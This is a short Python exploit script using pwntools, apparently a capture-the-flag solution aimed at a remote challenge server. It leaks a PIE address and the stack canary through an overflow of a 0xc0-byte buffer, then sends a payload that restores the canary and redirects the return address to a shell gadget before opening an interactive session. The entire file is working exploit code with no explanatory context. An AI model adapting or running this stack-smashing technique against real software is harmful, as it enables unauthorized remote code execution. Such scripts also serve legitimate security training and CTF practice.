from pwn import *
import time

p = remote("srv1.kitriwhs.kr", 14249)
elf = ELF("./prob")

gadget = elf.symbols['gadget']
stack_chk_fail_got = elf.got['__stack_chk_fail']

p.recvuntil("0x")
pie = int(p.recv(12), 16)

p.recvuntil("\n")
p.sendline("1")
p.sendline("A" * 0xc0)
p.recvuntil("\n")
canary = u64(b'\x00' + p.recv(7))

base = pie - 0x00000000000013db
shell = base + 0x7aa
payload = b"A" * 0xc0 + p64(canary) + b"A" * 8 + p64(shell)

p.sendline(payload)

p.interactive()
